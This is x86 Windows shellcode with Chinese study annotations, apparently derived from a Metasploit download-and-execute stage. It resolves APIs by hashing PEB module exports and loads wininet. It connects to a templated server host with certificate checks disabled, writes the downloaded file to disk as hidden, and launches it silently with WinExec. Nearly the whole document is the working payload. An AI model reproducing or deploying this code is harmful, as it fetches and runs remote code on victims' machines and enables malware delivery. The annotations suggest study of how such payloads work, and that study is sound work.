api_call:;
pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
mov ebp, esp           ; Create a new stack frame  函数调用，将基址指针赋给ebp
xor edx, edx           ; Zero EDX 清空EDX
mov edx, fs:[edx+30h]   ; Get a pointer to the PEB  【通过fs:[30h]获取当前进程的_PEB结构】 Process Environment Block——进程环境块；存放进程信息，每个进程都有自己的PEB信息。位于用户地址空间。
mov edx, [edx+0Ch]      ; Get PEB->Ldr  【通过_PEB的Ldr成员获取_PEB_LDR_DATA结构】Ldr地址存放一些指向动态链接库信息的链表地址；能得到进程加载的所有模块
mov edx, [edx+14h]      ; Get the first module from the InMemoryOrder module list 【根据加载顺序 只需要向前走两个模块就到了kernel32.dll的LDR_DATA_TABLE_ENTRY 此时就是指向LDR_DATA_TABLE_ENTRY的InMemoryOrderModuleList字段】
next_mod:
mov esi, [edx+28h]      ; Get pointer to modules name (unicode string) 【在0x028处获取 DllName的名称字符串】
movzx ecx, word [edx+26h] ; Set ECX to the length we want to check 【MaximumLength】
xor edi, edi           ; Clear EDI which will store the hash of the module name   【edi存放hash后的dll名称】
loop_modname:              ;【dll首字母为小写时执行】
xor eax, eax           ; Clear EAX
lodsb                  ; Read in the next byte of the name
cmp al, 'a'            ; Some versions of Windows use lower case module names
jl not_lowercase       ;
sub al, 0x20           ; If so normalise to uppercase
not_lowercase:             ;
ror edi, 13            ; Rotate right our hash value
add edi, eax           ; Add the next byte of the name
loop loop_modname      ; Loop untill we have read enough
; We now have the module hash computed  【计算名称哈希值】
push edx               ; Save the current position in the module list for later 【存储调用的API位置和名称hash】
push edi               ; Save the current module hash for later
; Proceed to iterate the export address table,【继续迭代导出地址表】
mov edx, [edx+16]      ; Get this modules base address
mov eax, [edx+60]      ; Get PE header【PE头】
add eax, edx           ; Add the modules base address
mov eax, [eax+120]     ; Get export tables RVA 【PE文件的相对虚拟地址】
test eax, eax          ; Test if no export address table is present【找导入表】
jz get_next_mod1       ; If no EAT present, process the next module
add eax, edx           ; Add the modules base address
push eax               ; Save the current modules EAT
mov ecx, [eax+24]      ; Get the number of function names 【获得dll内API个数和RVA】
mov ebx, [eax+32]      ; Get the rva of the function names
add ebx, edx           ; Add the modules base address
; Computing the module hash + function hash 
get_next_func:             ;
jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
dec ecx                ; Decrement the function name counter
mov esi, [ebx+ecx*4]   ; Get rva of next module name
add esi, edx           ; Add the modules base address
xor edi, edi           ; Clear EDI which will store the hash of the function name
; And compare it to the one we want
loop_funcname:             ;
xor eax, eax           ; Clear EAX
lodsb                  ; Read in the next byte of the ASCII function name
ror edi, 13            ; Rotate right our hash value
add edi, eax           ; Add the next byte of the name
cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
jne loop_funcname      ; If we have not reached the null terminator, continue 【串接获得完整function name哈希】
add edi, [ebp-8]       ; Add the current module hash to the function hash
cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for【hash对比】
jnz get_next_func      ; Go compute the next function hash if we have not found it
; If found, fix up stack, call the function and then value else compute the next one…
pop eax                ; Restore the current modules EAT
mov ebx, [eax+36]      ; Get the ordinal table rva
add ebx, edx           ; Add the modules base address
mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
mov ebx, [eax+28]      ; Get the function addresses table rva
add ebx, edx           ; Add the modules base address
mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
add eax, edx           ; Add the modules base address to get the functions actual VA 【获得API真实地址】
; We now fix up the stack and perform the call to the desired function...
finish:
		  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad 【重写EAX】
		  pop ebx                ; Clear off the current modules hash
		  pop ebx                ; Clear off the current position in the module list
		  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
		  pop ecx                ; Pop off the origional return address our caller will have pushed
		  pop edx                ; Pop off the hash value our caller will have pushed
		  push ecx               ; Push back the correct return value
		  jmp eax                ; Jump into the required function
		  ; We now automagically return to the correct caller...
		get_next_mod:              ;
		  pop eax                ; Pop off the current (now the previous) modules EAT【！！！】
		get_next_mod1:             ;
		  pop edi                ; Pop off the current (now ′07 previous) modules hash
		  pop edx                ; Restore our position in the module list
		  mov edx, [edx]         ; Get the next module
		  jmp.i8 next_mod        ; Process this module
		
		; actual routine
		start:
		  pop ebp                ; get ptr to block_api routine
		; based on HDM's block_reverse_https.asm
		load_wininet:
		  push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.【要使用的dll】
		  push 0x696e6977        ; ...
		  mov esi, esp           ; Save a pointer to wininet
		  push esp               ; Push a pointer to the "wininet" string on the stack.
		  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )【利用LoadLibraryA加载对应API函数】
		  call ebp               ; LoadLibraryA( "wininet" )
		
		internetopen:;【初始化WinINet函数】
		  xor edi,edi
		  push edi               ; DWORD dwFlags
		  push edi               ; LPCTSTR lpszProxyBypass
		  push edi               ; LPCTSTR lpszProxyName
		  push edi               ; DWORD dwAccessType (PRECONFIG = 0)
		  push esi               ; LPCTSTR lpszAgent ("wininet\x00")
		  push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
		  call ebp
		
		  jmp.i8 dbl_get_server_host
		
		internetconnect:;【建立 Internet 的连接】
		  pop ebx                ; Save the hostname pointer
		  xor ecx, ecx
		  push ecx               ; DWORD_PTR dwContext (NULL)
		  push ecx               ; dwFlags
		  push #{protoflags[proto]}	; DWORD dwService (INTERNET_SERVICE_HTTP or INTERNET_SERVICE_FTP)
		  push ecx               ; password
		  push ecx               ; username
		  push #{port_nr}        ; PORT
		  push ebx               ; HOSTNAME
		  push eax               ; HINTERNET hInternet
		  push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )  Windows应用程序网络相关模块
		  call ebp
		
		  jmp.i8 get_server_uri
		
		httpopenrequest:
		  pop ecx
		  xor edx, edx            ; NULL
		  push edx                ; dwContext (NULL)
		  #{dwflags_asm}          ; dwFlags
		  push edx                ; accept types
		  push edx                ; referrer
		  push edx                ; version
		  push ecx                ; url
		  push edx                ; method
		  push eax                ; hConnection
		  push 0x3B2E55EB         ; hash( "wininet.dll", "HttpOpenRequestA" )
		  call ebp
		  mov esi, eax            ; hHttpRequest
		
		set_retry:
		  push 0x10
		  pop ebx
		
		; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
		set_security_options:
		  push 0x00003380
		  mov eax, esp
		  push 4                 ; sizeof(dwFlags)
		  push eax               ; &dwFlags
		  push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
		  push esi               ; hRequest
		  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
		  call ebp
		
		httpsendrequest:
		  xor edi, edi
		  push edi               ; optional length
		  push edi               ; optional
		  push edi               ; dwHeadersLength
		  push edi               ; headers
		  push esi               ; hHttpRequest
		  push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
		  call ebp
		  test eax,eax
		  jnz create_file
		
		try_it_again:
		  dec ebx
		  jz thats_all_folks	; failure -> exit
		  jmp.i8 set_security_options
		
		dbl_get_server_host:
		  jmp get_server_host
		
		get_server_uri:
		  call httpopenrequest
		
		server_uri:
		  db "#{server_uri}", 0x00
		
		create_file:
		  jmp.i8 get_filename
		
		get_filename_return:
		  xor eax,eax       ; zero eax
		  pop edi           ; ptr to filename
		  push eax          ; hTemplateFile
		  push 2            ; dwFlagsAndAttributes (Hidden)
		  push 2            ; dwCreationDisposition (CREATE_ALWAYS)
		  push eax          ; lpSecurityAttributes
		  push 2            ; dwShareMode
		  push 2            ; dwDesiredAccess
		  push edi          ; lpFileName
		  push 0x4FDAF6DA   ; kernel32.dll!CreateFileA
		  call ebp
		
		download_prep:
		  xchg eax, ebx     ; place the file handle in ebx
		  xor eax,eax       ; zero eax
		  mov ax,0x304      ; we'll download 0x300 bytes at a time
		  sub esp,eax       ; reserve space on stack
		
		download_more:
		  push esp          ; &bytesRead
		  lea ecx,[esp+0x8] ; target buffer
		  xor eax,eax
		  mov ah,0x03       ; eax => 300
		  push eax          ; read length
		  push ecx          ; target buffer on stack
		  push esi          ; hRequest
		  push 0xE2899612   ; hash( "wininet.dll", "InternetReadFile" )
		  call ebp
		
		  test eax,eax        ; download failed? (optional?)
		  jz thats_all_folks  ; failure -> exit
		
		  pop eax             ; how many bytes did we retrieve ?
		
		  test eax,eax        ; optional?
		  je close_and_run    ; continue until it returns 0
		
		write_to_file:
		  push 0              ; lpOverLapped
		  push esp            ; lpNumberOfBytesWritten
		  push eax            ; nNumberOfBytesToWrite
		  lea eax,[esp+0xc]   ; get pointer to buffer
		  push eax            ; lpBuffer
		  push ebx            ; hFile
		  push 0x5BAE572D     ; kernel32.dll!WriteFile  将下载数据写入文件
		  call ebp
		  sub esp,4           ; set stack back to where it was
		  jmp.i8 download_more
		
		close_and_run:
		  push ebx
		  push 0x528796C6    ; kernel32.dll!CloseHandle
		  call ebp
		
		execute_file:
		  push 0             ; don't show
		  push edi           ; lpCmdLine
		  push 0x876F8B31    ; kernel32.dll!WinExec  exe执行
		  call ebp
		
		thats_all_folks:
		  #{exitasm}
		
		get_filename:
		  call get_filename_return
		  db "#{filename}",0x00
		
		get_server_host:
		  call internetconnect
		
		server_host:
		  db "#{server_host}", 0x00